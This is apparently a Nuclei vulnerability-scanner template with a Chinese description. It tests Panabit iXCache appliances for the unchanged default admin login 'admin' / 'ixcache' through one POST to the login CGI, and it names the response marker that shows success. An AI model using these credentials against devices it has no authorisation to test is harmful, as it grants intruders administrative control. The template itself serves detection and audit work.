id: panabit-ixcache-default-login

info:
  name: Panabit iXCache 默认管理员登录（弱口令）
  author: ritikchaddha
  severity: high
  description: 该模板通过尝试 Panabit iXCache 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - http://forum.panabit.com/thread-10830-1-1.html
  metadata:
    max-request: 1
  tags: default-login,ixcache,panabit,vuln

http:
  - raw:
      - |
        POST /login/userverify.cgi HTTP/1.1
        Host: {{Hostname}}

        username={{username}}&password={{password}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - ixcache

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "URL=/cgi-bin/monitor.cgi"

      - type: status
        status:
          - 200
